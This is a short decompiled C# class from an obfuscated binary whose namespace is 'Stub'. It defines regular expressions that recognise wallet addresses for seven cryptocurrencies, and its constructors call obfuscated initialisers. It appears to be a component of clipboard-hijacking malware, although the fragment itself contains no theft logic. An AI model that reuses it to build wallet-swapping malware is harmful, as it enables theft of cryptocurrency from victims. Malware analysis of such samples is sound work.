using System;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using dg3ypDAonQcOidMs0w;
using rE4lpnT863QnijKQK5;

namespace Stub
{
	// Token: 0x0200009E RID: 158
	internal sealed class RegexPatterns
	{
		// Token: 0x06000233 RID: 563 RVA: 0x000038B4 File Offset: 0x00001AB4
		public RegexPatterns()
		{
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			base..ctor();
		}

		// Token: 0x06000234 RID: 564 RVA: 0x00015CDC File Offset: 0x00013EDC
		static RegexPatterns()
		{
			WP6RZJql8gZrNhVA9v.prXoP4RuYp();
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			RegexPatterns.PatternsList = new Dictionary<string, Regex>
			{
				{
					"btc",
					new Regex("^(bc1[qp]|[13])[a-km-zA-HJ-NP-Z1-9]{25,59}$|^bc1[ac-hj-np-z02-9]{8,87}$", RegexOptions.IgnoreCase)
				},
				{
					"eth",
					new Regex("^(0x)?[0-9a-fA-F]{40}$")
				},
				{
					"ltc",
					new Regex("^[LM3][a-km-zA-HJ-NP-Z1-9]{26,34}$")
				},
				{
					"bch",
					new Regex("^(bitcoincash:)?([qp][a-z0-9]{41}|[QP][A-Z0-9]{41})$")
				},
				{
					"xmr",
					new Regex("^[48][0-9AB][1-9A-HJ-NP-Za-km-z]{93}$")
				},
				{
					"trx",
					new Regex("^T[a-zA-Z0-9]{33}$")
				},
				{
					"sol",
					new Regex("^[1-9A-HJ-NP-Za-km-z]{44}$")
				}
			};
		}

		// Token: 0x040004F2 RID: 1266
		public static readonly Dictionary<string, Regex> PatternsList;
	}
}
